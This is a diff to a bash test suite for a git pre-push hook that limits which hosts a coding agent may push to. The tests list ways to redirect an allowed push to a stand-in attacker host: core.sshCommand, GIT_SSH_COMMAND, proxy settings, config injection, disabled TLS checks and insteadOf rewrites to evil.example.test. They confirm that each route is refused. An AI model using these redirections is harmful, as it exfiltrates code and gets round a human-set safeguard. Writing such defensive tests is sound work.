@@ -6,20 +6,24 @@
 # home, bound to the URL git pushes to: another URL, another host, another
 # remote, a differing pushurl or a self-supplied BEARING_ENV, XDG_CONFIG_HOME
 # or HOME does not count, and neither does an exported BEARING_AUTO_PUSH.
-# bash 3.2 safe.
+# The transport is bound too: an ssh command, proxy, config injection,
+# insteadOf rewrite of origin, other hooks path or disabled TLS check refuses,
+# and only ssh://, scp-style and https:// URLs (a port other than the default
+# part of the key) can be listed. bash 3.2 safe.
 set -u
 . "$(dirname "$0")/../lib/assert.sh"
 H="$KIT/plugins/bearing/templates/repo/.githooks"
-unset BEARING_ENV BEARING_AUTO_PUSH
+unset BEARING_ENV BEARING_AUTO_PUSH GIT_SSH GIT_SSH_COMMAND GIT_SSH_VARIANT GIT_PROXY_COMMAND GIT_CONFIG_COUNT GIT_CONFIG_PARAMETERS
 home="$(tmpdir)"; mkdir -p "$home/.config/bearing"; envf="$home/.config/bearing/bearing.env"
-srv="$(tmpdir)"
-# A stand-in for ssh: runs the git command it is handed against $srv, whatever
-# the host, so the hook sees a real ssh or scp-style URL in $2.
-fakessh="$srv/fake-ssh"
-printf '#!/bin/sh\nfor a; do last="$a"; done\ncmd="${last%%%% *}"; p="${last#* }"; p="$(eval "printf %%s $p")"\nexec $cmd "%s/${p#/}"\n' "$srv" > "$fakessh"
-chmod +x "$fakessh"
-export GIT_SSH_COMMAND="$fakessh" GIT_SSH_VARIANT=simple
-git init -q --bare "$srv/group/shop.git"
+srv="$(tmpdir)"; evil="$(tmpdir)"
+# Stand-ins for ssh: each runs the git command it is handed against a
+# directory, whatever the host, so the hook sees a real ssh or scp-style URL
+# in $2. $srv/bin/ssh is the plain transport (found on PATH as ssh); the
+# attacker's one lands the push in $evil.
+mkdir -p "$srv/bin"
+mkssh() { printf '#!/bin/sh\nfor a; do last="$a"; done\ncmd="${last%%%% *}"; p="${last#* }"; p="$(eval "printf %%s $p")"\nexec $cmd "%s/${p#/}"\n' "$2" > "$1"; chmod +x "$1"; }
+mkssh "$srv/bin/ssh" "$srv"; evilssh="$evil/evil-ssh"; mkssh "$evilssh" "$evil"
+git init -q --bare "$srv/group/shop.git"; git init -q --bare "$evil/group/shop.git"
 
 setup() {
   repo="$(tmpdir)"; remote="$(tmpdir)/r.git"; git init -q --bare "$remote"
@@ -38,7 +42,18 @@ setup() {
 }
 # XDG_CONFIG_HOME points at the same file, so a hook that still honoured it
 # would see the same opt-in; the self-supplied cases below point it elsewhere.
-agent_push() { ( cd "$repo" && CLAUDECODE=1 XDG_CONFIG_HOME="$home/.config" git push "$@" 2>&1 ) }
+agent_push() { ( cd "$repo" && PATH="$srv/bin:$PATH" CLAUDECODE=1 XDG_CONFIG_HOME="$home/.config" git push "$@" 2>&1 ) }
+# ssh_origin [url]: origin at a listed ssh URL served by $srv/bin/ssh, both
+# hosts' repositories empty again.
+ssh_origin() {
+  rm -rf "$srv/group/shop.git" "$evil/group/shop.git"
+  git init -q --bare "$srv/group/shop.git"; git init -q --bare "$evil/group/shop.git"
+  printf 'BEARING_AUTO_PUSH="git.example.test/group/shop"\n' > "$envf"
+  git -C "$repo" remote set-url origin "${1:-git@git.example.test:group/shop.git}"
+}
+evil_refs() { git --git-dir="$evil/group/shop.git" for-each-ref --format='%(refname)'; }
+# agent_git <args>: git as the agent runs it, e.g. brg-push's pinned -c flags.
+agent_git() { ( cd "$repo" && PATH="$srv/bin:$PATH" CLAUDECODE=1 git "$@" 2>&1 ) }
 fake() { d="$(tmpdir)"; mkdir -p "$d/bearing"; printf 'BEARING_AUTO_PUSH="%s"\n' "$1" > "$d/bearing/bearing.env"; printf '%s' "$d"; }
 
 t_begin "agent push refused without the opt-in"
@@ -93,10 +108,11 @@ assert_contains "$T_OUT" "a coding agent is pushing"
 assert_contains "$T_OUT" "pushurl"
 t_end
 
-t_begin "a pushInsteadOf redirect is judged on the rewritten URL"
+t_begin "a pushInsteadOf redirect of origin is refused, naming the key"
 setup; other="$(tmpdir)/x.git"; git init -q --bare "$other"; git -C "$repo" config "url.$other.pushInsteadOf" "$remote"
 t_run agent_push origin HEAD:refs/heads/feature/ABC-1-Exfil
-assert_contains "$T_OUT" "is not listed in BEARING_AUTO_PUSH"
+assert_contains "$T_OUT" "url.$other.pushinsteadof redirects the transport"
+assert_not_contains "$T_OUT" "gate passed"
 t_end
 
 t_begin "another remote name is refused even when its URL is listed"
@@ -129,12 +145,99 @@ assert_contains "$T_OUT" "agent push allowed by BEARING_AUTO_PUSH: 1 branch ref(
 t_end
 
 t_begin "url_key normalises https, ssh and scp-style URLs the same way"
-for u in https://git.example.test/group/shop.git https://user:tok@Git.Example.Test:8443/group/shop/ \
-         ssh://git@git.example.test:2222/group/shop.git git@git.example.test:group/shop.git git.example.test:/group/shop; do
+for u in https://git.example.test/group/shop.git https://user:tok@Git.Example.Test:443/group/shop/ \
+         ssh://git@git.example.test:22/group/shop.git git@git.example.test:group/shop.git git.example.test:/group/shop; do
   assert_eq "git.example.test/group/shop" "$(bash -c '. "$1/lib.sh"; url_key "$2"' _ "$H" "$u")" "$u"
 done
 assert_eq "localhost/srv/git/shop" "$(bash -c '. "$1/lib.sh"; url_key "$2"' _ "$H" /srv/git/shop.git)" "local path"
 assert_exit 1 bash -c '. "$1/lib.sh"; url_key "$2"' _ "$H" ../relative/shop.git
+t_end
+
+t_begin "url_key keeps a port other than the default"
+assert_eq "git.example.test:2222/group/shop" "$(bash -c '. "$1/lib.sh"; url_key "$2"' _ "$H" ssh://git@git.example.test:2222/group/shop.git)" "ssh port"
+assert_eq "git.example.test:8443/group/shop" "$(bash -c '. "$1/lib.sh"; url_key "$2"' _ "$H" https://user:tok@Git.Example.Test:8443/group/shop/)" "https port"
+assert_eq "git.example.test:443/group/shop" "$(bash -c '. "$1/lib.sh"; url_key "$2"' _ "$H" ssh://git@git.example.test:443/group/shop.git)" "443 is not the ssh default"
+t_end
+
+t_begin "url_key refuses http, git, other schemes and helper forms"
+for u in http://git.example.test/group/shop.git git://git.example.test/group/shop.git \
+         ftp://git.example.test/group/shop.git git+ssh://git@git.example.test/group/shop.git \
+         ssh+git://git@git.example.test/group/shop.git evil::git@git.example.test:group/shop.git \
+         evil::https://git.example.test/group/shop.git ssh://git@git.example.test:x/group/shop.git; do
+  assert_exit 1 bash -c '. "$1/lib.sh"; url_key "$2"' _ "$H" "$u"
+done
+t_end
+
+t_begin "a port other than the listed one is refused; listing the port allows it"
+setup; ssh_origin ssh://git@git.example.test:2222/group/shop.git
+t_run agent_push origin HEAD:refs/heads/feature/ABC-1-Thing
+assert_contains "$T_OUT" "git.example.test:2222/group/shop is not listed in BEARING_AUTO_PUSH"
+printf 'BEARING_AUTO_PUSH="git.example.test:2222/group/shop"\n' > "$envf"
+t_run agent_push origin HEAD:refs/heads/feature/ABC-1-Thing
+assert_contains "$T_OUT" "agent push allowed by BEARING_AUTO_PUSH: 1 branch ref(s)"
+t_end
+
+t_begin "core.sshCommand cannot send an allowed push to another host"
+setup; ssh_origin; git -C "$repo" config core.sshCommand "$evilssh"
+t_run agent_push origin HEAD:refs/heads/feature/ABC-1-Thing
+assert_contains "$T_OUT" "core.sshcommand redirects the transport"
+assert_eq "" "$(evil_refs)" "nothing landed on the other host"
+t_end
+
+t_begin "GIT_SSH_COMMAND cannot send an allowed push to another host"
+setup; ssh_origin
+GIT_SSH_COMMAND="$evilssh" t_run agent_push origin HEAD:refs/heads/feature/ABC-1-Thing
+assert_contains "$T_OUT" "GIT_SSH_COMMAND redirects the transport"
+assert_eq "" "$(evil_refs)" "nothing landed on the other host"
+t_end
+
+t_begin "each transport variable in the environment refuses, naming it"
+setup; ssh_origin
+for row in "GIT_SSH=$evilssh" "GIT_SSH_COMMAND=$evilssh" "GIT_PROXY_COMMAND=$evilssh" \
+           "GIT_CONFIG_COUNT=1" "GIT_CONFIG_PARAMETERS='core.sshcommand'='$evilssh'"; do
+  v="${row%%=*}"; export "${row?}"
+  [ "$v" != GIT_CONFIG_COUNT ] || export GIT_CONFIG_KEY_0=core.sshCommand GIT_CONFIG_VALUE_0="$evilssh"
+  t_run agent_push origin HEAD:refs/heads/feature/ABC-1-Thing
+  unset "$v" GIT_CONFIG_KEY_0 GIT_CONFIG_VALUE_0
+  assert_contains "$T_OUT" "$v redirects the transport" "$v"
+done
+assert_eq "" "$(evil_refs)" "nothing landed on the other host"
+t_end
+
+t_begin "each transport setting in git config refuses, naming it"
+# Rows: the key as set, its value, the name the refusal gives (git's own
+# spelling: section and variable lower-cased, subsection kept).
+P=http://proxy.invalid:3128; E=ssh://git@evil.example.test/
+for row in "core.sshCommand $evilssh core.sshcommand" "core.gitProxy $evilssh core.gitproxy" \
+           "http.proxy $P http.proxy" "https.proxy $P https.proxy" "remote.origin.proxy $P remote.origin.proxy" \
+           "http.sslVerify false http.sslverify" "core.hooksPath @REPO@/.githooks core.hookspath" \
+           "url.$E.insteadOf git@git.example.test: url.$E.insteadof" \
+           "url.$E.pushInsteadOf git@git.example.test: url.$E.pushinsteadof"; do
+  setup; ssh_origin
+  set -- $row; k="$1"; val="${2/@REPO@/$repo}"; name="$3"
+  git -C "$repo" config "$k" "$val"
+  t_run agent_push origin HEAD:refs/heads/feature/ABC-1-Thing
+  assert_contains "$T_OUT" "$name redirects the transport" "$k"
+done
+assert_eq "" "$(evil_refs)" "nothing landed on the other host"
+t_end
+
+t_begin "a remote helper for origin refuses"
+setup; ssh_origin; git -C "$repo" config remote.origin.vcs evil
+t_run bash -c 'cd "$1" && . .githooks/lib.sh && auto_push_allowed origin git@git.example.test:group/shop.git; echo "why: $AUTO_WHY"' _ "$repo"
+assert_contains "$T_OUT" "remote.origin.vcs redirects the transport"
+t_end
+
+t_begin "with no transport setting, and with brg-push's pinned -c flags, the push is allowed"
+setup; ssh_origin
+git -C "$repo" config url.git@other.example.test:.insteadOf https://other.example.test/
+git -C "$repo" config http.sslVerify true
+t_run agent_push origin HEAD:refs/heads/feature/ABC-1-Thing
+assert_contains "$T_OUT" "agent push allowed by BEARING_AUTO_PUSH: 1 branch ref(s)"
+git -C "$repo" commit -q --allow-empty -m "feat: b [ABC-1]"
+t_run agent_git -c core.sshCommand=ssh -c core.hooksPath=.githooks push origin HEAD:refs/heads/feature/ABC-1-Thing
+assert_contains "$T_OUT" "agent push allowed by BEARING_AUTO_PUSH: 1 branch ref(s)"
+assert_contains "$T_OUT" "gate passed"
 t_end
 
 t_begin "passwd_home ignores HOME"
